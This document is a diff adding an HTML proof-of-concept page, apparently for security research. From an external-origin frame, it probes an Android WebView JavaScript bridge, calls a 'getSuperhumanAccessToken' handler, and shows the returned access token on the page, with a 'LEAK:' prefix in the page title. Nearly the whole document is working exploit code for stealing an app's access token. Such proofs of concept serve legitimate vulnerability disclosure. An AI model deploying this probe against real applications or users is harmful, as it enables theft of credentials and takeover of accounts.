@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Security Test</title>
+<meta property="og:title" content="Security Test">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Security research test page">
+<meta property="og:description" content="Security research test page">
+<link rel="canonical" href="https://petec0x0.github.io/Petec0x0/poc-bridge-probe.html">
+<meta property="og:url" content="https://petec0x0.github.io/Petec0x0/poc-bridge-probe.html">
+<meta property="og:site_name" content="Petec0x0">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="Security Test">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","description":"Security research test page","headline":"Security Test","name":"Petec0x0","url":"https://petec0x0.github.io/Petec0x0/poc-bridge-probe.html"}
+</script>
+</head>
+<body style="margin:0;font-family:monospace;background:#111;color:#0f0;padding:16px;">
+<h2 style="color:#f55;">ATTACKER FRAME (external origin: petec0x0.github.io)</h2>
+<div id="o">running probe...</div>
+<script>
+try {
+  if (window.androidHandler && window.androidHandler.postMessage) {
+    var r = window.androidHandler.postMessage(JSON.stringify({name: 'getSuperhumanAccessToken'}));
+    document.getElementById('o').textContent = 'origin=' + location.origin + '\n\nBRIDGE REACHABLE. TOKEN:\n' + r;
+    document.title = 'LEAK:' + String(r).substring(0, 30);
+  } else {
+    document.getElementById('o').textContent = 'window.androidHandler NOT present in this frame';
+    document.title = 'NO_BRIDGE';
+  }
+} catch (e) {
+  document.getElementById('o').textContent = 'ERROR: ' + e;
+  document.title = 'ERR:' + e;
+}
+</script>
+</body>
+</html>
